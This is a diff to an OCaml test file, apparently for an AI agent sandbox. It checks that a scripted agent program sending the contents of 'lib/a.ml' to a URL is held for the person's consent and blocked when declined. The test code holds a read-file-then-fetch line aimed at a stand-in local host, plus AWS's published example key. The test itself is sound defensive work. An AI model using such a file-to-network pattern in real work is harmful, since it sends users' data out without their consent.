@@ -622,20 +622,21 @@ let () =
          | [ "main finished with:\n\"aws [redacted secret]\\n\"" ], [ "aws AKIAIOSFODNN7EXAMPLE\n" ], true ->
              None
          | ran, _, _ -> Some ("redaction: the model saw a key, or replay changed: " ^ String.concat "; " ran));
-        (let exposed person =
+        (let flowed person url =
            let workspace = fresh () in
+           let asked = ref [] in
            let replies =
              ref
                [
                  fenced
-                   "module Main exposing (main)\n\n\
-                    import Agent exposing (..)\n\
-                    import Fetch\n\n\n\
-                    main : Task Fetch.FetchErr Int\n\
-                    main =\n\
-                   \    read \"lib/a.ml\" |> mapErr (\\_ -> Fetch.Unreachable \"\")\n\
-                   \        |> andThen (\\text -> Fetch.get (\"http://127.0.0.1:9/?\" ++ text))\n\
-                   \        |> map .status\n";
+                   ("module Main exposing (main)\n\n\
+                     import Agent exposing (..)\n\
+                     import Fetch\n\n\n\
+                     main : Task Fetch.FetchErr Int\n\
+                     main =\n\
+                    \    read \"lib/a.ml\" |> mapErr (\\_ -> Fetch.Unreachable \"\")\n\
+                    \        |> andThen (\\text -> Fetch.get (" ^ url ^ "))\n\
+                    \        |> map .status\n");
                  "Done.";
                ]
            in
@@ -650,22 +651,36 @@ let () =
                          Lwt.return (Ok reply)
                      | [] -> Lwt.return (Error (`Llm (Llm.Transport "no more replies"))));
                  approve = (fun _ -> Lwt.return Driver.Apply);
-                 person = (fun _ -> Lwt.return person);
+                 person =
+                   (fun question ->
+                     asked := question :: !asked;
+                     Lwt.return person);
                  handler = Handler.staged (Tools.at workspace) Handler.Open;
                  commit = Tools.commit (Tools.at workspace);
                  os = Os.granted "/project" ~net:[];
                  recorded = [];
                }
            in
-           ( List.length (List.filter (function Driver.Performed _ -> true | _ -> false) events),
-             List.find_map (function Driver.Ran text -> Some text | _ -> None) events,
-             collected (Driver.replayed (Os.granted "/project" ~net:[]) events) = (report, events) )
+           let replayed = collected (Driver.replayed (Os.granted "/project" ~net:[]) events) in
+           ( List.rev !asked,
+             Option.value ~default:"" (List.find_map (function Driver.Ran text -> Some text | _ -> None) events),
+             replayed = (report, events) )
          in
-         match (exposed Device.Declines, exposed Device.Agrees) with
-         | (0, Some refused, true), (2, Some _, true)
-           when String.starts_with ~prefix:"The person did not let this program read the project" refused ->
-             None
-         | _ -> Some "exposed: a program with all three legs ran without the person, or replay differs");
+         match
+           ( flowed Device.Declines "\"http://127.0.0.1:9/?q=\" ++ String.left 3 text",
+             flowed Device.Declines "\"http://127.0.0.1:9/\" ++ (if String.isEmpty text then \"a\" else \"b\")",
+             flowed Device.Declines "\"http://127.0.0.1:9/fixed\"" )
+         with
+        | ( ([ carried ], declined, true), ([ _ ], _, true), ([], fixed, true) )
+          when String.starts_with ~prefix:"send content of the project (lib/a.ml)" carried
+               && String.starts_with ~prefix:"main failed with:\nDeclined" declined
+               && String.starts_with ~prefix:"main failed with:\nNotGranted" fixed ->
+            None
+        | (asked, ran, _), _, _ ->
+            Some
+              ("flow: content of a file left without the person, a constant URL was held, or \
+                replay differs: "
+              ^ String.concat "; " asked ^ " / " ^ ran));
         (let held person =
            let workspace = fresh () in
            let replies =
